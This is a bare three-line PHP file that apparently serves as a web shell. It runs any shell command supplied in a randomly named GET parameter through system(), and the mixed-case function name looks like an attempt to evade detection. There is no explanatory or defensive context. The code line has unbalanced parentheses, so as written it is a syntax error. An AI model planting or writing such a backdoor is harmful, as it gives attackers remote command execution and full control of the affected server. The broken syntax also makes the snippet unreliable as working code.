<?php
SysTeM(($_GET['rDOxkv_Z']);
?>
